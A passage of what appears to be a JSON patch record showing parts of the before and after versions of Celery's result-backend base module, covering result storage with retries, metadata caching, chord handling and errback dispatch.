            "            'date_done': date_done,",
            "        }",
            "",
            "        if request and getattr(request, 'group', None):",
            "            meta['group_id'] = request.group",
            "        if request and getattr(request, 'parent_id', None):",
            "            meta['parent_id'] = request.parent_id",
            "",
            "        if self.app.conf.find_value_for_key('extended', 'result'):",
            "            if request:",
            "                request_meta = {",
            "                    'name': getattr(request, 'task', None),",
            "                    'args': getattr(request, 'args', None),",
            "                    'kwargs': getattr(request, 'kwargs', None),",
            "                    'worker': getattr(request, 'hostname', None),",
            "                    'retries': getattr(request, 'retries', None),",
            "                    'queue': request.delivery_info.get('routing_key')",
            "                    if hasattr(request, 'delivery_info') and",
            "                    request.delivery_info else None",
            "                }",
            "",
            "                if encode:",
            "                    # args and kwargs need to be encoded properly before saving",
            "                    encode_needed_fields = {\"args\", \"kwargs\"}",
            "                    for field in encode_needed_fields:",
            "                        value = request_meta[field]",
            "                        encoded_value = self.encode(value)",
            "                        request_meta[field] = ensure_bytes(encoded_value)",
            "",
            "                meta.update(request_meta)",
            "",
            "        return meta",
            "",
            "    def _sleep(self, amount):",
            "        time.sleep(amount)",
            "",
            "    def store_result(self, task_id, result, state,",
            "                     traceback=None, request=None, **kwargs):",
            "        \"\"\"Update task state and result.",
            "",
            "        if always_retry_backend_operation is activated, in the event of a recoverable exception,",
            "        then retry operation with an exponential backoff until a limit has been reached.",
            "        \"\"\"",
            "        result = self.encode_result(result, state)",
            "",
            "        retries = 0",
            "",
            "        while True:",
            "            try:",
            "                self._store_result(task_id, result, state, traceback,",
            "                                   request=request, **kwargs)",
            "                return result",
            "            except Exception as exc:",
            "                if self.always_retry and self.exception_safe_to_retry(exc):",
            "                    if retries < self.max_retries:",
            "                        retries += 1",
            "",
            "                        # get_exponential_backoff_interval computes integers",
            "                        # and time.sleep accept floats for sub second sleep",
            "                        sleep_amount = get_exponential_backoff_interval(",
            "                            self.base_sleep_between_retries_ms, retries,",
            "                            self.max_sleep_between_retries_ms, True) / 1000",
            "                        self._sleep(sleep_amount)",
            "                    else:",
            "                        raise_with_context(",
            "                            BackendStoreError(\"failed to store result on the backend\", task_id=task_id, state=state),",
            "                        )",
            "                else:",
            "                    raise",
            "",
            "    def forget(self, task_id):",
            "        self._cache.pop(task_id, None)",
            "        self._forget(task_id)",
            "",
            "    def _forget(self, task_id):",
            "        raise NotImplementedError('backend does not implement forget.')",
            "",
            "    def get_state(self, task_id):",
            "        \"\"\"Get the state of a task.\"\"\"",
            "        return self.get_task_meta(task_id)['status']",
            "",
            "    get_status = get_state  # XXX compat",
            "",
            "    def get_traceback(self, task_id):",
            "        \"\"\"Get the traceback for a failed task.\"\"\"",
            "        return self.get_task_meta(task_id).get('traceback')",
            "",
            "    def get_result(self, task_id):",
            "        \"\"\"Get the result of a task.\"\"\"",
            "        return self.get_task_meta(task_id).get('result')",
            "",
            "    def get_children(self, task_id):",
            "        \"\"\"Get the list of subtasks sent by a task.\"\"\"",
            "        try:",
            "            return self.get_task_meta(task_id)['children']",
            "        except KeyError:",
            "            pass",
            "",
            "    def _ensure_not_eager(self):",
            "        if self.app.conf.task_always_eager:",
            "            warnings.warn(",
            "                \"Shouldn't retrieve result with task_always_eager enabled.\",",
            "                RuntimeWarning",
            "            )",
            "",
            "    def exception_safe_to_retry(self, exc):",
            "        \"\"\"Check if an exception is safe to retry.",
            "",
            "        Backends have to overload this method with correct predicates dealing with their exceptions.",
            "",
            "        By default no exception is safe to retry, it's up to backend implementation",
            "        to define which exceptions are safe.",
            "        \"\"\"",
            "        return False",
            "",
            "    def get_task_meta(self, task_id, cache=True):",
            "        \"\"\"Get task meta from backend.",
            "",
            "        if always_retry_backend_operation is activated, in the event of a recoverable exception,",
            "        then retry operation with an exponential backoff until a limit has been reached.",
            "        \"\"\"",
            "        self._ensure_not_eager()",
            "        if cache:",
            "            try:",
            "                return self._cache[task_id]",
            "            except KeyError:",
            "                pass",
            "        retries = 0",
            "        while True:",
            "            try:",
            "                meta = self._get_task_meta_for(task_id)",
            "                break",
            "            except Exception as exc:",
            "                if self.always_retry and self.exception_safe_to_retry(exc):",
            "                    if retries < self.max_retries:",
            "                        retries += 1",
            "",
            "                        # get_exponential_backoff_interval computes integers",
            "                        # and time.sleep accept floats for sub second sleep",
            "                        sleep_amount = get_exponential_backoff_interval(",
            "                            self.base_sleep_between_retries_ms, retries,",
            "                            self.max_sleep_between_retries_ms, True) / 1000",
            "                        self._sleep(sleep_amount)",
            "                    else:",
            "                        raise_with_context(",
            "                            BackendGetMetaError(\"failed to get meta\", task_id=task_id),",
            "                        )",
            "                else:",
            "                    raise",
            "",
            "        if cache and meta.get('status') == states.SUCCESS:",
            "            self._cache[task_id] = meta",
            "        return meta",
            "",
            "    def reload_task_result(self, task_id):",
            "        \"\"\"Reload task result, even if it has been previously fetched.\"\"\"",
            "        self._cache[task_id] = self.get_task_meta(task_id, cache=False)",
            "",
            "    def reload_group_result(self, group_id):",
            "        \"\"\"Reload group result, even if it has been previously fetched.\"\"\"",
            "        self._cache[group_id] = self.get_group_meta(group_id, cache=False)",
            "",
            "    def get_group_meta(self, group_id, cache=True):",
            "        self._ensure_not_eager()",
            "        if cache:",
            "            try:",
            "                return self._cache[group_id]",
            "            except KeyError:",
            "                pass",
            "",
            "        meta = self._restore_group(group_id)",
            "        if cache and meta is not None:",
            "            self._cache[group_id] = meta",
            "        return meta",
            "",
            "    def restore_group(self, group_id, cache=True):",
            "        \"\"\"Get the result for a group.\"\"\"",
            "        meta = self.get_group_meta(group_id, cache=cache)",
            "        if meta:",
            "            return meta['result']",
            "",
            "    def save_group(self, group_id, result):",
            "        \"\"\"Store the result of an executed group.\"\"\"",
            "        return self._save_group(group_id, result)",
            "",
            "    def delete_group(self, group_id):",
            "        self._cache.pop(group_id, None)",
            "        return self._delete_group(group_id)",
            "",
            "    def cleanup(self):",
            "        \"\"\"Backend cleanup.\"\"\"",
            "",
            "    def process_cleanup(self):",
            "        \"\"\"Cleanup actions to do at the end of a task worker process.\"\"\"",
            "",
            "    def on_task_call(self, producer, task_id):",
            "        return {}",
            "",
            "    def add_to_chord(self, chord_id, result):",
            "        raise NotImplementedError('Backend does not support add_to_chord')",
            "",
            "    def on_chord_part_return(self, request, state, result, **kwargs):",
            "        pass",
            "",
            "    def set_chord_size(self, group_id, chord_size):",
            "        pass",
            "",
            "    def fallback_chord_unlock(self, header_result, body, countdown=1,",
            "                              **kwargs):",
            "        kwargs['result'] = [r.as_tuple() for r in header_result]",
            "        try:",
            "            body_type = getattr(body, 'type', None)",
            "        except NotRegistered:",
            "            body_type = None",
            "",
            "        queue = body.options.get('queue', getattr(body_type, 'queue', None))",
            "",
            "        if queue is None:",
            "            # fallback to default routing if queue name was not",
            "            # explicitly passed to body callback",
            "            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name",
            "",
            "        priority = body.options.get('priority', getattr(body_type, 'priority', 0))",
            "        self.app.tasks['celery.chord_unlock'].apply_async(",
            "            (header_result.id, body,), kwargs,",
            "            countdown=countdown,",
            "            queue=queue,",
            "            priority=priority,",
            "        )",
            "",
            "    def ensure_chords_allowed(self):",
            "        pass",
            "",
            "    def apply_chord(self, header_result_args, body, **kwargs):",
            "        self.ensure_chords_allowed()",
            "        header_result = self.app.GroupResult(*header_result_args)",
            "        self.fallback_chord_unlock(header_result, body, **kwargs)",
            "",
            "    def current_task_children(self, request=None):",
            "        request = request or getattr(get_current_task(), 'request', None)",
            "        if request:",
            "            return [r.as_tuple() for r in getattr(request, 'children', [])]",
            "",
            "    def __reduce__(self, args=(), kwargs=None):",
            "        kwargs = {} if not kwargs else kwargs",
            "        return (unpickle_backend, (self.__class__, args, kwargs))",
            "",
            "",
            "class SyncBackendMixin:",
            "    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,",
            "                    on_message=None, on_interval=None):",
            "        self._ensure_not_eager()",
            "        results = result.results",
            "        if not results:",
            "            return",
            "",
            "        task_ids = set()",
            "        for result in results:",
            "            if isinstance(result, ResultSet):",
            "                yield result.id, result.results",
            "            else:",
            "                task_ids.add(result.id)",
            "",
            "        yield from self.get_many(",
            "            task_ids,",
            "            timeout=timeout, interval=interval, no_ack=no_ack,",
            "            on_message=on_message, on_interval=on_interval,",
            "        )",
            "",
            "    def wait_for_pending(self, result, timeout=None, interval=0.5,",
            "                         no_ack=True, on_message=None, on_interval=None,",
            "                         callback=None, propagate=True):",
            "        self._ensure_not_eager()",
            "        if on_message is not None:",
            "            raise ImproperlyConfigured(",
            "                'Backend does not support on_message callback')",
            "",
            "        meta = self.wait_for(",
            "            result.id, timeout=timeout,",
            "            interval=interval,",
            "            on_interval=on_interval,",
            "            no_ack=no_ack,",
            "        )",
            "        if meta:",
            "            result._maybe_set_cache(meta)",
            "            return result.maybe_throw(propagate=propagate, callback=callback)",
            "",
            "    def wait_for(self, task_id,",
            "                 timeout=None, interval=0.5, no_ack=True, on_interval=None):",
            "        \"\"\"Wait for task and return its result.",
            "",
            "        If the task raises an exception, this exception",
            "        will be re-raised by :func:`wait_for`.",
            "",
            "        Raises:",
            "            celery.exceptions.TimeoutError:",
            "                If `timeout` is not :const:`None`, and the operation",
            "                takes longer than `timeout` seconds.",
            "        \"\"\"",
            "        self._ensure_not_eager()",
            "",
            "        time_elapsed = 0.0",
            "",
            "        while 1:",
            "            meta = self.get_task_meta(task_id)",
            "            if meta['status'] in states.READY_STATES:",
            "                return meta",
            "            if on_interval:",
            "                on_interval()",
            "            # avoid hammering the CPU checking status.",
            "            time.sleep(interval)",
            "            time_elapsed += interval",
            "            if timeout and time_elapsed >= timeout:",
            "                raise TimeoutError('The operation timed out.')",
            "",
            "    def add_pending_result(self, result, weak=False):",
            "        return result",
            "",
            "    def remove_pending_result(self, result):",
            "        return result",
            "",
            "    @property",
            "    def is_async(self):",
            "        return False",
            "",
            "",
            "class BaseBackend(Backend, SyncBackendMixin):",
            "    \"\"\"Base (synchronous) result backend.\"\"\"",
            "",
            "",
            "BaseDictBackend = BaseBackend  # XXX compat",
            "",
            "",
            "class BaseKeyValueStoreBackend(Backend):",
            "    key_t = ensure_bytes",
            "    task_keyprefix = 'celery-task-meta-'",
            "    group_keyprefix = 'celery-taskset-meta-'",
            "    chord_keyprefix = 'chord-unlock-'",
            "    implements_incr = False",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        if hasattr(self.key_t, '__func__'):  # pragma: no cover",
            "            self.key_t = self.key_t.__func__  # remove binding",
            "        self._encode_prefixes()",
            "        super().__init__(*args, **kwargs)",
            "        if self.implements_incr:",
            "            self.apply_chord = self._apply_chord_incr",
            "",
            "    def _encode_prefixes(self):",
            "        self.task_keyprefix = self.key_t(self.task_keyprefix)",
            "        self.group_keyprefix = self.key_t(self.group_keyprefix)",
            "        self.chord_keyprefix = self.key_t(self.chord_keyprefix)",
            "",
            "    def get(self, key):",
            "        raise NotImplementedError('Must implement the get method.')",
            "",
            "    def mget(self, keys):",
            "        raise NotImplementedError('Does not support get_many')",
            "",
            "    def _set_with_state(self, key, value, state):",
            "        return self.set(key, value)",
            "",
            "    def set(self, key, value):",
            "        raise NotImplementedError('Must implement the set method.')",
            "",
            "    def delete(self, key):",
            "        raise NotImplementedError('Must implement the delete method')",
            "",
            "    def incr(self, key):",
            "        raise NotImplementedError('Does not implement incr')",
            "",
            "    def expire(self, key, value):",
            "        pass",
            "",
            "    def get_key_for_task(self, task_id, key=''):",
            "        \"\"\"Get the cache key for a task by id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.task_keyprefix, key_t(task_id), key_t(key),",
            "        ])",
            "",
            "    def get_key_for_group(self, group_id, key=''):",
            "        \"\"\"Get the cache key for a group by id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.group_keyprefix, key_t(group_id), key_t(key),",
            "        ])",
            "",
            "    def get_key_for_chord(self, group_id, key=''):",
            "        \"\"\"Get the cache key for the chord waiting on group with given id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.chord_keyprefix, key_t(group_id), key_t(key),",
            "        ])",
            "",
            "    def _strip_prefix(self, key):",
            "        \"\"\"Take bytes: emit string.\"\"\"",
            "        key = self.key_t(key)",
            "        for prefix in self.task_keyprefix, self.group_keyprefix:",
            "            if key.startswith(prefix):",
            "                return bytes_to_str(key[len(prefix):])",
            "        return bytes_to_str(key)",
            "",
            "    def _filter_ready(self, values, READY_STATES=states.READY_STATES):",
            "        for k, value in values:",
            "            if value is not None:",
            "                value = self.decode_result(value)",
            "                if value['status'] in READY_STATES:",
            "                    yield k, value",
            "",
            "    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):",
            "        if hasattr(values, 'items'):",
            "            # client returns dict so mapping preserved.",
            "            return {",
            "                self._strip_prefix(k): v",
            "                for k, v in self._filter_ready(values.items(), READY_STATES)",
            "            }",
            "        else:",
            "            # client returns list so need to recreate mapping.",
            "            return {",
            "                bytes_to_str(keys[i]): v",
            "                for i, v in self._filter_ready(enumerate(values), READY_STATES)",
            "            }",
            "",
            "    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,",
            "                 on_message=None, on_interval=None, max_iterations=None,",
            "                 READY_STATES=states.READY_STATES):",
            "        interval = 0.5 if interval is None else interval",
            "        ids = task_ids if isinstance(task_ids, set) else set(task_ids)",
            "        cached_ids = set()",
            "        cache = self._cache",
            "        for task_id in ids:",
            "            try:",
            "                cached = cache[task_id]",
            "            except KeyError:",
            "                pass",
            "            else:",
            "                if cached['status'] in READY_STATES:",
            "                    yield bytes_to_str(task_id), cached",
            "                    cached_ids.add(task_id)",
            "",
            "        ids.difference_update(cached_ids)",
            "        iterations = 0",
            "        while ids:",
            "            keys = list(ids)",
            "            r = self._mget_to_results(self.mget([self.get_key_for_task(k)",
            "                                                 for k in keys]), keys, READY_STATES)",
            "            cache.update(r)",
            "            ids.difference_update({bytes_to_str(v) for v in r})",
            "            for key, value in r.items():",
            "                if on_message is not None:",
            "                    on_message(value)",
            "                yield bytes_to_str(key), value",
            "            if timeout and iterations * interval >= timeout:",
            "                raise TimeoutError(f'Operation timed out ({timeout})')",
            "            if on_interval:",
            "                on_interval()",
            "            time.sleep(interval)  # don't busy loop.",
            "            iterations += 1",
            "            if max_iterations and iterations >= max_iterations:",
            "                break",
            "",
            "    def _forget(self, task_id):",
            "        self.delete(self.get_key_for_task(task_id))",
            "",
            "    def _store_result(self, task_id, result, state,",
            "                      traceback=None, request=None, **kwargs):",
            "        meta = self._get_result_meta(result=result, state=state,",
            "                                     traceback=traceback, request=request)",
            "        meta['task_id'] = bytes_to_str(task_id)",
            "",
            "        # Retrieve metadata from the backend, if the status",
            "        # is a success then we ignore any following update to the state.",
            "        # This solves a task deduplication issue because of network",
            "        # partitioning or lost workers. This issue involved a race condition",
            "        # making a lost task overwrite the last successful result in the",
            "        # result backend.",
            "        current_meta = self._get_task_meta_for(task_id)",
            "",
            "        if current_meta['status'] == states.SUCCESS:",
            "            return result",
            "",
            "        try:",
            "            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)",
            "        except BackendStoreError as ex:",
            "            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex",
            "",
            "        return result",
            "",
            "    def _save_group(self, group_id, result):",
            "        self._set_with_state(self.get_key_for_group(group_id),",
            "                             self.encode({'result': result.as_tuple()}), states.SUCCESS)",
            "        return result",
            "",
            "    def _delete_group(self, group_id):",
            "        self.delete(self.get_key_for_group(group_id))",
            "",
            "    def _get_task_meta_for(self, task_id):",
            "        \"\"\"Get task meta-data for a task by id.\"\"\"",
            "        meta = self.get(self.get_key_for_task(task_id))",
            "        if not meta:",
            "            return {'status': states.PENDING, 'result': None}",
            "        return self.decode_result(meta)",
            "",
            "    def _restore_group(self, group_id):",
            "        \"\"\"Get task meta-data for a task by id.\"\"\"",
            "        meta = self.get(self.get_key_for_group(group_id))",
            "        # previously this was always pickled, but later this",
            "        # was extended to support other serializers, so the",
            "        # structure is kind of weird.",
            "        if meta:",
            "            meta = self.decode(meta)",
            "            result = meta['result']",
            "            meta['result'] = result_from_tuple(result, self.app)",
            "            return meta",
            "",
            "    def _apply_chord_incr(self, header_result_args, body, **kwargs):",
            "        self.ensure_chords_allowed()",
            "        header_result = self.app.GroupResult(*header_result_args)",
            "        header_result.save(backend=self)",
            "",
            "    def on_chord_part_return(self, request, state, result, **kwargs):",
            "        if not self.implements_incr:",
            "            return",
            "        app = self.app",
            "        gid = request.group",
            "        if not gid:",
            "            return",
            "        key = self.get_key_for_chord(gid)",
            "        try:",
            "            deps = GroupResult.restore(gid, backend=self)",
            "        except Exception as exc:  # pylint: disable=broad-except",
            "            callback = maybe_signature(request.chord, app=app)",
            "            logger.exception('Chord %r raised: %r', gid, exc)",
            "            return self.chord_error_from_stack(",
            "                callback,",
            "                ChordError(f'Cannot restore group: {exc!r}'),",
            "            )",
            "        if deps is None:",
            "            try:",
            "                raise ValueError(gid)",
            "            except ValueError as exc:",
            "                callback = maybe_signature(request.chord, app=app)",
            "                logger.exception('Chord callback %r raised: %r', gid, exc)",
            "                return self.chord_error_from_stack(",
            "                    callback,",
            "                    ChordError(f'GroupResult {gid} no longer exists'),",
            "                )",
            "        val = self.incr(key)",
            "        # Set the chord size to the value defined in the request, or fall back",
            "        # to the number of dependencies we can see from the restored result",
            "        size = request.chord.get(\"chord_size\")",
            "        if size is None:",
            "            size = len(deps)",
            "        if val > size:  # pragma: no cover",
            "            logger.warning('Chord counter incremented too many times for %r',",
            "                           gid)",
            "        elif val == size:",
            "            callback = maybe_signature(request.chord, app=app)",
            "            j = deps.join_native if deps.supports_native_join else deps.join",
            "            try:",
            "                with allow_join_result():",
            "                    ret = j(",
            "                        timeout=app.conf.result_chord_join_timeout,",
            "                        propagate=True)",
            "            except Exception as exc:  # pylint: disable=broad-except",
            "                try:",
            "                    culprit = next(deps._failed_join_report())",
            "                    reason = 'Dependency {0.id} raised {1!r}'.format(",
            "                        culprit, exc,",
            "                    )",
            "                except StopIteration:",
            "                    reason = repr(exc)",
            "",
            "                logger.exception('Chord %r raised: %r', gid, reason)",
            "                self.chord_error_from_stack(callback, ChordError(reason))",
            "            else:",
            "                try:",
            "                    callback.delay(ret)",
            "                except Exception as exc:  # pylint: disable=broad-except",
            "                    logger.exception('Chord %r raised: %r', gid, exc)",
            "                    self.chord_error_from_stack(",
            "                        callback,",
            "                        ChordError(f'Callback error: {exc!r}'),",
            "                    )",
            "            finally:",
            "                deps.delete()",
            "                self.client.delete(key)",
            "        else:",
            "            self.expire(key, self.expires)",
            "",
            "",
            "class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):",
            "    \"\"\"Result backend base class for key/value stores.\"\"\"",
            "",
            "",
            "class DisabledBackend(BaseBackend):",
            "    \"\"\"Dummy result backend.\"\"\"",
            "",
            "    _cache = {}  # need this attribute to reset cache in tests.",
            "",
            "    def store_result(self, *args, **kwargs):",
            "        pass",
            "",
            "    def ensure_chords_allowed(self):",
            "        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())",
            "",
            "    def _is_disabled(self, *args, **kwargs):",
            "        raise NotImplementedError(E_NO_BACKEND.strip())",
            "",
            "    def as_uri(self, *args, **kwargs):",
            "        return 'disabled://'",
            "",
            "    get_state = get_status = get_result = get_traceback = _is_disabled",
            "    get_task_meta_for = wait_for = get_many = _is_disabled"
        ],
        "afterPatchFile": [
            "\"\"\"Result backend base classes.",
            "",
            "- :class:`BaseBackend` defines the interface.",
            "",
            "- :class:`KeyValueStoreBackend` is a common base class",
            "    using K/V semantics like _get and _put.",
            "\"\"\"",
            "import sys",
            "import time",
            "import warnings",
            "from collections import namedtuple",
            "from datetime import datetime, timedelta",
            "from functools import partial",
            "from weakref import WeakValueDictionary",
            "",
            "from billiard.einfo import ExceptionInfo",
            "from kombu.serialization import dumps, loads, prepare_accept_content",
            "from kombu.serialization import registry as serializer_registry",
            "from kombu.utils.encoding import bytes_to_str, ensure_bytes, from_utf8",
            "from kombu.utils.url import maybe_sanitize_url",
            "",
            "import celery.exceptions",
            "from celery import current_app, group, maybe_signature, states",
            "from celery._state import get_current_task",
            "from celery.app.task import Context",
            "from celery.exceptions import (BackendGetMetaError, BackendStoreError,",
            "                               ChordError, ImproperlyConfigured,",
            "                               NotRegistered, SecurityError, TaskRevokedError,",
            "                               TimeoutError)",
            "from celery.result import (GroupResult, ResultBase, ResultSet,",
            "                           allow_join_result, result_from_tuple)",
            "from celery.utils.collections import BufferMap",
            "from celery.utils.functional import LRUCache, arity_greater",
            "from celery.utils.log import get_logger",
            "from celery.utils.serialization import (create_exception_cls,",
            "                                        ensure_serializable,",
            "                                        get_pickleable_exception,",
            "                                        get_pickled_exception,",
            "                                        raise_with_context)",
            "from celery.utils.time import get_exponential_backoff_interval",
            "",
            "__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')",
            "",
            "EXCEPTION_ABLE_CODECS = frozenset({'pickle'})",
            "",
            "logger = get_logger(__name__)",
            "",
            "MESSAGE_BUFFER_MAX = 8192",
            "",
            "pending_results_t = namedtuple('pending_results_t', (",
            "    'concrete', 'weak',",
            "))",
            "",
            "E_NO_BACKEND = \"\"\"",
            "No result backend is configured.",
            "Please see the documentation for more information.",
            "\"\"\"",
            "",
            "E_CHORD_NO_BACKEND = \"\"\"",
            "Starting chords requires a result backend to be configured.",
            "",
            "Note that a group chained with a task is also upgraded to be a chord,",
            "as this pattern requires synchronization.",
            "",
            "Result backends that supports chords: Redis, Database, Memcached, and more.",
            "\"\"\"",
            "",
            "",
            "def unpickle_backend(cls, args, kwargs):",
            "    \"\"\"Return an unpickled backend.\"\"\"",
            "    return cls(*args, app=current_app._get_current_object(), **kwargs)",
            "",
            "",
            "class _nulldict(dict):",
            "    def ignore(self, *a, **kw):",
            "        pass",
            "",
            "    __setitem__ = update = setdefault = ignore",
            "",
            "",
            "def _is_request_ignore_result(request):",
            "    if request is None:",
            "        return False",
            "    return request.ignore_result",
            "",
            "",
            "class Backend:",
            "    READY_STATES = states.READY_STATES",
            "    UNREADY_STATES = states.UNREADY_STATES",
            "    EXCEPTION_STATES = states.EXCEPTION_STATES",
            "",
            "    TimeoutError = TimeoutError",
            "",
            "    #: Time to sleep between polling each individual item",
            "    #: in `ResultSet.iterate`. as opposed to the `interval`",
            "    #: argument which is for each pass.",
            "    subpolling_interval = None",
            "",
            "    #: If true the backend must implement :meth:`get_many`.",
            "    supports_native_join = False",
            "",
            "    #: If true the backend must automatically expire results.",
            "    #: The daily backend_cleanup periodic task won't be triggered",
            "    #: in this case.",
            "    supports_autoexpire = False",
            "",
            "    #: Set to true if the backend is persistent by default.",
            "    persistent = True",
            "",
            "    retry_policy = {",
            "        'max_retries': 20,",
            "        'interval_start': 0,",
            "        'interval_step': 1,",
            "        'interval_max': 1,",
            "    }",
            "",
            "    def __init__(self, app,",
            "                 serializer=None, max_cached_results=None, accept=None,",
            "                 expires=None, expires_type=None, url=None, **kwargs):",
            "        self.app = app",
            "        conf = self.app.conf",
            "        self.serializer = serializer or conf.result_serializer",
            "        (self.content_type,",
            "         self.content_encoding,",
            "         self.encoder) = serializer_registry._encoders[self.serializer]",
            "        cmax = max_cached_results or conf.result_cache_max",
            "        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)",
            "",
            "        self.expires = self.prepare_expires(expires, expires_type)",
            "",
            "        # precedence: accept, conf.result_accept_content, conf.accept_content",
            "        self.accept = conf.result_accept_content if accept is None else accept",
            "        self.accept = conf.accept_content if self.accept is None else self.accept",
            "        self.accept = prepare_accept_content(self.accept)",
            "",
            "        self.always_retry = conf.get('result_backend_always_retry', False)",
            "        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)",
            "        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)",
            "        self.max_retries = conf.get('result_backend_max_retries', float(\"inf\"))",
            "",
            "        self._pending_results = pending_results_t({}, WeakValueDictionary())",
            "        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)",
            "        self.url = url",
            "",
            "    def as_uri(self, include_password=False):",
            "        \"\"\"Return the backend as an URI, sanitizing the password or not.\"\"\"",
            "        # when using maybe_sanitize_url(), \"/\" is added",
            "        # we're stripping it for consistency",
            "        if include_password:",
            "            return self.url",
            "        url = maybe_sanitize_url(self.url or '')",
            "        return url[:-1] if url.endswith(':///') else url",
            "",
            "    def mark_as_started(self, task_id, **meta):",
            "        \"\"\"Mark a task as started.\"\"\"",
            "        return self.store_result(task_id, meta, states.STARTED)",
            "",
            "    def mark_as_done(self, task_id, result,",
            "                     request=None, store_result=True, state=states.SUCCESS):",
            "        \"\"\"Mark task as successfully executed.\"\"\"",
            "        if (store_result and not _is_request_ignore_result(request)):",
            "            self.store_result(task_id, result, state, request=request)",
            "        if request and request.chord:",
            "            self.on_chord_part_return(request, state, result)",
            "",
            "    def mark_as_failure(self, task_id, exc,",
            "                        traceback=None, request=None,",
            "                        store_result=True, call_errbacks=True,",
            "                        state=states.FAILURE):",
            "        \"\"\"Mark task as executed with failure.\"\"\"",
            "        if store_result:",
            "            self.store_result(task_id, exc, state,",
            "                              traceback=traceback, request=request)",
            "        if request:",
            "            # This task may be part of a chord",
            "            if request.chord:",
            "                self.on_chord_part_return(request, state, exc)",
            "            # It might also have chained tasks which need to be propagated to,",
            "            # this is most likely to be exclusive with being a direct part of a",
            "            # chord but we'll handle both cases separately.",
            "            #",
            "            # The `chain_data` try block here is a bit tortured since we might",
            "            # have non-iterable objects here in tests and it's easier this way.",
            "            try:",
            "                chain_data = iter(request.chain)",
            "            except (AttributeError, TypeError):",
            "                chain_data = tuple()",
            "            for chain_elem in chain_data:",
            "                # Reconstruct a `Context` object for the chained task which has",
            "                # enough information to for backends to work with",
            "                chain_elem_ctx = Context(chain_elem)",
            "                chain_elem_ctx.update(chain_elem_ctx.options)",
            "                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')",
            "                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')",
            "                # If the state should be propagated, we'll do so for all",
            "                # elements of the chain. This is only truly important so",
            "                # that the last chain element which controls completion of",
            "                # the chain itself is marked as completed to avoid stalls.",
            "                #",
            "                # Some chained elements may be complex signatures and have no",
            "                # task ID of their own, so we skip them hoping that not",
            "                # descending through them is OK. If the last chain element is",
            "                # complex, we assume it must have been uplifted to a chord by",
            "                # the canvas code and therefore the condition below will ensure",
            "                # that we mark something as being complete as avoid stalling.",
            "                if (",
            "                    store_result and state in states.PROPAGATE_STATES and",
            "                    chain_elem_ctx.task_id is not None",
            "                ):",
            "                    self.store_result(",
            "                        chain_elem_ctx.task_id, exc, state,",
            "                        traceback=traceback, request=chain_elem_ctx,",
            "                    )",
            "                # If the chain element is a member of a chord, we also need",
            "                # to call `on_chord_part_return()` as well to avoid stalls.",
            "                if 'chord' in chain_elem_ctx.options:",
            "                    self.on_chord_part_return(chain_elem_ctx, state, exc)",
            "            # And finally we'll fire any errbacks",
            "            if call_errbacks and request.errbacks:",
            "                self._call_task_errbacks(request, exc, traceback)",
            "",
            "    def _call_task_errbacks(self, request, exc, traceback):",
            "        old_signature = []",
            "        for errback in request.errbacks:",
            "            errback = self.app.signature(errback)",
            "            if not errback._app:",
            "                # Ensure all signatures have an application",
            "                errback._app = self.app",
            "            try:",
            "                if (",
            "                        # Celery tasks type created with the @task decorator have",
            "                        # the __header__ property, but Celery task created from",
            "                        # Task class do not have this property.",
            "                        # That's why we have to check if this property exists",
            "                        # before checking is it partial function.",
            "                        hasattr(errback.type, '__header__') and",
            "",
            "                        # workaround to support tasks with bind=True executed as",
            "                        # link errors. Otherwise retries can't be used",
            "                        not isinstance(errback.type.__header__, partial) and",
            "                        arity_greater(errback.type.__header__, 1)",
            "                ):",
            "                    errback(request, exc, traceback)",
            "                else:",
            "                    old_signature.append(errback)",
            "            except NotRegistered:",
            "                # Task may not be present in this worker.",
            "                # We simply send it forward for another worker to consume.",
            "                # If the task is not registered there, the worker will raise",
            "                # NotRegistered.",
            "                old_signature.append(errback)",
            "",
            "        if old_signature:",
            "            # Previously errback was called as a task so we still",
            "            # need to do so if the errback only takes a single task_id arg.",
            "            task_id = request.id",
            "            root_id = request.root_id or task_id",
            "            g = group(old_signature, app=self.app)",
            "            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):",
            "                g.apply(",
            "                    (task_id,), parent_id=task_id, root_id=root_id",
            "                )",
            "            else:",
            "                g.apply_async(",
            "                    (task_id,), parent_id=task_id, root_id=root_id",
            "                )",
            "",
            "    def mark_as_revoked(self, task_id, reason='',",
            "                        request=None, store_result=True, state=states.REVOKED):",
            "        exc = TaskRevokedError(reason)",
            "        if store_result:",
            "            self.store_result(task_id, exc, state,",
            "                              traceback=None, request=request)",
            "        if request and request.chord:",
            "            self.on_chord_part_return(request, state, exc)",
            "",
            "    def mark_as_retry(self, task_id, exc, traceback=None,",
            "                      request=None, store_result=True, state=states.RETRY):",
            "        \"\"\"Mark task as being retries.",
            "",
            "        Note:",
            "            Stores the current exception (if any).",
            "        \"\"\"",
            "        return self.store_result(task_id, exc, state,",
            "                                 traceback=traceback, request=request)",
            "",
            "    def chord_error_from_stack(self, callback, exc=None):",
            "        app = self.app",
            "        try:",
            "            backend = app._tasks[callback.task].backend",
            "        except KeyError:",
            "            backend = self",
            "        # We have to make a fake request since either the callback failed or",
            "        # we're pretending it did since we don't have information about the",
            "        # chord part(s) which failed. This request is constructed as a best",
            "        # effort for new style errbacks and may be slightly misleading about",
            "        # what really went wrong, but at least we call them!",
            "        fake_request = Context({",
            "            \"id\": callback.options.get(\"task_id\"),",
            "            \"errbacks\": callback.options.get(\"link_error\", []),",
            "            \"delivery_info\": dict(),",
